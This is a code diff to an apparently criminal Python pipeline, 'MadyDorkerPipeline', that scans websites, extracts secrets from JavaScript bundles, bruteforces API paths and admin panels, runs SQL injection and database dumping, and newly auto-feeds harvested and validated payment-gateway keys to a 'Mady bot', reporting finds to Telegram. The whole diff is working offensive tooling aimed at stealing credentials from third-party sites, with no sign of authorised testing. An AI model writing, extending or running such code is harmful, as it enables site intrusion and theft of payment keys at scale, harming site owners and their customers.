@@ -88,6 +88,7 @@ from key_validator import KeyValidator, KeyValidation
 from ml_filter import MLFilter, FilterResult
 from js_analyzer import JSBundleAnalyzer, JSAnalysisResult, analyze_js_bundles
 from api_bruteforcer import APIBruteforcer, BruteforceResult, bruteforce_api
+from mady_feeder import MadyFeeder, MadyFeederConfig, feed_to_mady, get_feeder
 from hint_engine import (
     get_cookie_hint, get_secret_hint, get_endpoint_hint,
     get_waf_hint, get_port_hint, get_sqli_hint, get_dump_hint,
@@ -344,6 +345,18 @@ class MadyDorkerPipeline:
             )
             self.dump_parser = DumpParser()  # Standalone dump parser for external files
             logger.info("📦 Auto Dumper v1.0 enabled (inject → dump → parse → report pipeline)")
+        
+        # Mady Bot Feeder — auto-feed gateway keys to Mady bot (v3.21)
+        self.mady_feeder = None
+        if getattr(self.config, 'mady_bot_feed', True):
+            try:
+                self.mady_feeder = MadyFeeder(MadyFeederConfig(
+                    enabled=True,
+                    mady_path=getattr(self.config, 'mady_bot_path', '/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0'),
+                ))
+                logger.info("🤖 Mady Bot feeder enabled (50+ gateway types)")
+            except Exception as e:
+                logger.warning(f"Mady Bot feeder init failed: {e}")
         
         # In-memory state (synced to DB)
         self.seen_domains: Set[str] = set()
@@ -615,6 +628,9 @@ class MadyDorkerPipeline:
             "cors": [],
             "redirects": [],
             "crlf": [],
+            "js_analysis": None,
+            "api_bruteforce": None,
+            "mady_fed": 0,
         }
         
         domain = urlparse(url).netloc
@@ -866,6 +882,18 @@ class MadyDorkerPipeline:
                                         url, secret.type, secret.value,
                                         {"confidence": secret.confidence}
                                     )
+                                    # Auto-feed to Mady bot
+                                    if self.mady_feeder:
+                                        try:
+                                            fed = self.mady_feeder.feed_gateway(
+                                                url, secret.type, secret.value,
+                                                extra={"confidence": secret.confidence, "source": "secret_extraction"},
+                                            )
+                                            if fed:
+                                                result["mady_fed"] = result.get("mady_fed", 0) + 1
+                                                logger.info(f"🤖 Fed gateway to Mady: {secret.type} from {url[:50]}")
+                                        except Exception as e:
+                                            logger.debug(f"Mady feed failed: {e}")
                                 else:
                                     self.found_secrets.append({
                                         "url": url,
@@ -883,6 +911,181 @@ class MadyDorkerPipeline:
                                             url, secret.type, secret.key_name,
                                             secret.value, secret.category,
                                         )
+                    
+                    # ─── Step 3b: JS Bundle Analysis ───────────────────────────
+                    # Parse webpack/Next.js/Vite chunks for hidden API endpoints,
+                    # secrets, page routes, GraphQL schemas, env vars, source maps
+                    js_analysis_result = None
+                    detected_framework = ""
+                    
+                    if getattr(self.config, 'js_analysis_enabled', True):
+                        try:
+                            # Pass cookies we've collected so far for auth'd JS fetching
+                            collected_cookies = result.get("cookies", {}).get("all", {})
+                            crawl_html = None
+                            if crawl_result and hasattr(crawl_result, 'html_pages') and crawl_result.html_pages:
+                                crawl_html = crawl_result.html_pages[0].html if crawl_result.html_pages else None
+                            
+                            js_analysis_result = await analyze_js_bundles(
+                                url,
+                                cookies=collected_cookies if collected_cookies else None,
+                                html_content=crawl_html,
+                            )
+                            detected_framework = js_analysis_result.framework or ""
+                            
+                            if js_analysis_result.api_endpoints or js_analysis_result.secrets or js_analysis_result.page_routes:
+                                result["js_analysis"] = {
+                                    "framework": detected_framework,
+                                    "build_tool": js_analysis_result.build_tool,
+                                    "js_files": js_analysis_result.js_files_analyzed,
+                                    "js_bytes": js_analysis_result.total_js_bytes,
+                                    "api_endpoints": len(js_analysis_result.api_endpoints),
+                                    "secrets": len(js_analysis_result.secrets),
+                                    "routes": len(js_analysis_result.page_routes),
+                                    "graphql": len(js_analysis_result.graphql_endpoints) if js_analysis_result.graphql_endpoints else 0,
+                                    "websockets": len(js_analysis_result.websocket_urls) if js_analysis_result.websocket_urls else 0,
+                                    "source_maps": len(js_analysis_result.source_maps) if js_analysis_result.source_maps else 0,
+                                    "env_vars": len(js_analysis_result.env_vars) if js_analysis_result.env_vars else 0,
+                                }
+                                
+                                # Feed JS-discovered endpoints into param URL set for SQLi testing
+                                base_parsed = urlparse(url)
+                                base_domain = base_parsed.netloc
+                                
+                                for ep in js_analysis_result.api_endpoints:
+                                    ep_parsed = urlparse(ep.url)
+                                    if ep_parsed.netloc == base_domain or not ep_parsed.netloc:
+                                        full_ep = ep.url if ep_parsed.netloc else f"{base_parsed.scheme}://{base_domain}{ep.url}"
+                                        discovered_param_urls.add(full_ep)
+                                
+                                # Add page routes as URLs to test
+                                for route in js_analysis_result.page_routes:
+                                    if route.startswith("/"):
+                                        discovered_param_urls.add(f"{base_parsed.scheme}://{base_domain}{route}")
+                                
+                                # JS-discovered secrets → into result + report
+                                for s in js_analysis_result.secrets:
+                                    secret_obj_type = getattr(s, 'secret_type', 'unknown')
+                                    secret_val = getattr(s, 'value', '')
+                                    secret_key = getattr(s, 'key_name', '')
+                                    secret_conf = getattr(s, 'confidence', 0.5)
+                                    result["secrets"].append({
+                                        "type": secret_obj_type,
+                                        "name": secret_key,
+                                        "value": secret_val,
+                                        "category": "js_bundle",
+                                    })
+                                    self.db.add_secret(url, secret_obj_type, secret_key, secret_val, "js_bundle", secret_conf)
+                                    self.found_secrets.append({
+                                        "url": url, "type": secret_obj_type,
+                                        "value": secret_val, "time": datetime.now().isoformat(),
+                                    })
+                                    if secret_conf >= 0.80:
+                                        await self.reporter.report_secret(
+                                            url, secret_obj_type, secret_key, secret_val, "js_bundle",
+                                        )
+                                
+                                # Report summary to Telegram
+                                js_msg = (
+                                    f"🔬 <b>JS Bundle Analysis</b>\n"
+                                    f"<code>{url[:60]}</code>\n"
+                                    f"📦 {js_analysis_result.js_files_analyzed} files, "
+                                    f"{js_analysis_result.total_js_bytes // 1024} KB\n"
+                                )
+                                if detected_framework:
+                                    js_msg += f"Framework: <b>{detected_framework}</b>\n"
+                                if js_analysis_result.api_endpoints:
+                                    js_msg += f"🎯 API Endpoints: <b>{len(js_analysis_result.api_endpoints)}</b>\n"
+                                if js_analysis_result.secrets:
+                                    js_msg += f"🔑 Secrets: <b>{len(js_analysis_result.secrets)}</b>\n"
+                                if js_analysis_result.page_routes:
+                                    js_msg += f"📍 Routes: <b>{len(js_analysis_result.page_routes)}</b>\n"
+                                if js_analysis_result.graphql_endpoints:
+                                    js_msg += f"📊 GraphQL: {len(js_analysis_result.graphql_endpoints)}\n"
+                                if js_analysis_result.source_maps:
+                                    js_msg += f"📁 Source Maps: {len(js_analysis_result.source_maps)} (LEAKED!)\n"
+                                if js_analysis_result.env_vars:
+                                    js_msg += f"🌐 Env Vars: {len(js_analysis_result.env_vars)} leaked\n"
+                                
+                                await self.reporter.report_finding(url, js_msg)
+                                logger.info(
+                                    f"[JS] {url[:50]} → {len(js_analysis_result.api_endpoints)} endpoints, "
+                                    f"{len(js_analysis_result.secrets)} secrets, {len(js_analysis_result.page_routes)} routes"
+                                )
+                        except Exception as e:
+                            logger.warning(f"[JS] Analysis failed for {url[:60]}: {e}")
+                    
+                    # ─── Step 3c: API Endpoint Bruteforce ──────────────────────
+                    # Probe common REST/GraphQL paths, OpenAPI specs, admin panels
+                    if getattr(self.config, 'api_bruteforce_enabled', True):
+                        try:
+                            # Build custom paths from JS discoveries
+                            custom_paths = []
+                            if js_analysis_result and js_analysis_result.page_routes:
+                                for route in js_analysis_result.page_routes:
+                                    if route.startswith("/"):
+                                        custom_paths.append(route)
+                                        if not route.startswith("/api/"):
+                                            custom_paths.append(f"/api{route}")
+                            
+                            collected_cookies = result.get("cookies", {}).get("all", {})
+                            
+                            api_brute_result = await bruteforce_api(
+                                url=url,
+                                framework=detected_framework,
+                                cookies=collected_cookies if collected_cookies else None,
+                                custom_paths=custom_paths if custom_paths else None,
+                            )
+                            
+                            if api_brute_result.endpoints_found:
+                                result["api_bruteforce"] = {
+                                    "probed": api_brute_result.endpoints_probed,
+                                    "open": len(api_brute_result.open_endpoints),
+                                    "auth_required": len(api_brute_result.auth_endpoints),
+                                    "graphql_introspection": api_brute_result.graphql_introspection,
+                                    "openapi_spec": api_brute_result.openapi_spec_url or None,
+                                    "openapi_endpoints": len(api_brute_result.openapi_endpoints) if api_brute_result.openapi_endpoints else 0,
+                                    "admin_panels": len(getattr(api_brute_result, 'admin_panels', []) or []),
+                                }
+                                
+                                # Feed discovered endpoints into SQLi testing pool
+                                for ep in api_brute_result.open_endpoints:
+                                    ep_parsed = urlparse(ep.url)
+                                    discovered_param_urls.add(ep.url)
+                                    if ep_parsed.query:
+                                        discovered_param_urls.add(ep.url)
+                                
+                                # Report to Telegram
+                                bf_msg = (
+                                    f"🔨 <b>API Bruteforce</b>\n"
+                                    f"<code>{url[:60]}</code>\n"
+                                    f"Probed: {api_brute_result.endpoints_probed}\n"
+                                )
+                                if api_brute_result.open_endpoints:
+                                    bf_msg += f"✅ Open: <b>{len(api_brute_result.open_endpoints)}</b>\n"
+                                    for ep in api_brute_result.open_endpoints[:3]:
+                                        bf_msg += f"  {ep.method} <code>{ep.url[:60]}</code> [{ep.status}]\n"
+                                if api_brute_result.auth_endpoints:
+                                    bf_msg += f"🔒 Auth-required: <b>{len(api_brute_result.auth_endpoints)}</b>\n"
+                                if api_brute_result.graphql_introspection:
+                                    bf_msg += "📊 <b>GraphQL introspection OPEN!</b>\n"
+                                if api_brute_result.openapi_spec_url:
+                                    bf_msg += f"📋 OpenAPI: <code>{api_brute_result.openapi_spec_url[:60]}</code>\n"
+                                    bf_msg += f"   Parsed: {len(api_brute_result.openapi_endpoints)} endpoints\n"
+                                admin_panels = getattr(api_brute_result, 'admin_panels', None)
+                                if admin_panels:
+                                    bf_msg += f"🔐 Admin Panels: <b>{len(admin_panels)}</b>\n"
+                                    for ap in admin_panels[:3]:
+                                        bf_msg += f"  <code>{ap.url[:60]}</code>\n"
+                                
+                                await self.reporter.report_finding(url, bf_msg)
+                                logger.info(
+                                    f"[API] {url[:50]} → {len(api_brute_result.open_endpoints)} open, "
+                                    f"{len(api_brute_result.auth_endpoints)} auth, "
+                                    f"graphql={'YES' if api_brute_result.graphql_introspection else 'no'}"
+                                )
+                        except Exception as e:
+                            logger.warning(f"[API] Bruteforce failed for {url[:60]}: {e}")
                     
                     # Step 4: SQLi Testing (now with cookie/header/POST injection + WAF bypass)
                     # Also test param URLs discovered by the recursive crawler
@@ -974,6 +1177,18 @@ class MadyDorkerPipeline:
                                                     "source": f"auto_dump_{parsed.source}",
                                                     "time": datetime.now().isoformat(),
                                                 })
+                                                # Auto-feed dump-discovered gateways to Mady
+                                                if self.mady_feeder:
+                                                    try:
+                                                        fed = self.mady_feeder.feed_gateway(
+                                                            url, key_entry.get("type", "db_key"),
+                                                            key_entry.get("value", ""),
+                                                            extra={"source": f"auto_dump_{parsed.source}"},
+                                                        )
+                                                        if fed:
+                                                            result["mady_fed"] = result.get("mady_fed", 0) + 1
+                                                    except Exception:
+                                                        pass
                                             for vk in parsed.valid_keys:
                                                 self.found_gateways.append({
                                                     "url": url,
@@ -982,6 +1197,18 @@ class MadyDorkerPipeline:
                                                     "source": "auto_dump_validated",
                                                     "time": datetime.now().isoformat(),
                                                 })
+                                                # Auto-feed validated keys to Mady
+                                                if self.mady_feeder:
+                                                    try:
+                                                        fed = self.mady_feeder.feed_gateway(
+                                                            url, vk.get("type", "validated_key"),
+                                                            vk.get("value", ""),
+                                                            extra={"source": "auto_dump_validated"},
+                                                        )
+                                                        if fed:
+                                                            result["mady_fed"] = result.get("mady_fed", 0) + 1
+                                                    except Exception:
+                                                        pass
                                     except Exception as e:
                                         logger.warning(f"Auto-dump error for {url}: {e}")
                                         # Fallback to legacy dumper on auto_dump failure
